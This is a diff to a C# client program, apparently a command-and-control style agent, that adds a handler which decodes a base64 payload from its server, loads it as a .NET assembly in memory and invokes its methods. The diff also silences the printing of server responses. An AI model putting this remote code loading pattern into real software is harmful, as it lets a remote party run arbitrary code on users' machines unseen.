@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Threading.Tasks;
 using System.Net;
 using System.Net.Http;
+using System.Reflection;
 using System.Runtime;
 using System.IO;
 using System.Text;
@@ -155,6 +156,16 @@ namespace client
         }
 
         private async Task<string> PluginCommand(string command){
+            //saves a file transfered from the server
+            //should take real commands to run with real plugins
+            //that are loaded with assembly from a dll
+            Assembly asm = Assembly.Load(Base64DecodeFile(command));
+            foreach(Type oType in asm.GetTypes()){
+                //debug
+                dynamic c = Activator.CreateInstance(oType);
+                var method = oType.GetMethod("echo");
+                method.Invoke(c, null);
+            }
             File.WriteAllBytes("./file", Base64DecodeFile(command));
             return "lala";
         }
@@ -192,7 +203,7 @@ namespace client
                 HttpResponseMessage response = await httpclient.PostAsync(this.uri, content);
                 response.EnsureSuccessStatusCode();
 
-                Console.WriteLine(await response.Content.ReadAsStringAsync());
+                //Console.WriteLine(await response.Content.ReadAsStringAsync());
                 string body = await response.Content.ReadAsStringAsync();
                 return (true, body);
             }
